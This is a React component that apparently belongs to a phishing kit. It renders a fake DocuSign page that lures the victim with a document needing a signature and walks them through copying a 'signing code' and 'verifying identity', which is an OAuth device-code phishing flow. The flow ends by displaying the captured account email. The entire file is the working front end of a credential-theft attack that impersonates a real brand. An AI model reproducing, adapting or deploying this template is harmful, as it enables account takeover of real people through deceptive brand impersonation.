import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function DocuSignCenteredTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('docusign-centered');

  return (
    <div className="tpl-page" style={{ background: '#fff' }}>
      <div className="tpl-container" style={{ maxWidth: 460 }}>
        <div style={{ textAlign: 'center', marginBottom: 28 }}>
          <svg width="140" height="32" viewBox="0 0 140 32"><text x="0" y="24" fill="#3F3B9B" fontSize="24" fontWeight="700" fontFamily="Arial">DocuSign</text></svg>
        </div>

        <div className="tpl-card" style={{ textAlign: 'center' }}>
          {f.state === 'idle' && (
            <>
              <div style={{ marginBottom: 16 }}>
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#3F3B9B" strokeWidth="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><path d="M9 15l2 2 4-4"/></svg>
              </div>
              <h1 className="tpl-title">Review and Sign Document</h1>
              <p className="tpl-text" style={{ textAlign: 'center' }}>You have received a document requiring your signature. Please verify your identity to proceed.</p>
              <button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleStart}>Verify to Sign</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Loading document...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Identity Verification</h1>
              <p className="tpl-text" style={{ textAlign: 'center' }}>Enter this code to verify your identity before signing.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">SIGNING CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps" style={{ textAlign: 'left' }}><div className="tpl-step">1. Copy the signing code above</div><div className="tpl-step">2. Click verify and enter the code</div></div>
              <button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleVerify}>Verify Identity</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Verified</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You may now sign the document.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Sign another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><p className="tpl-text">Please try again.</p><button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#3F3B9B' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>DocuSign Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
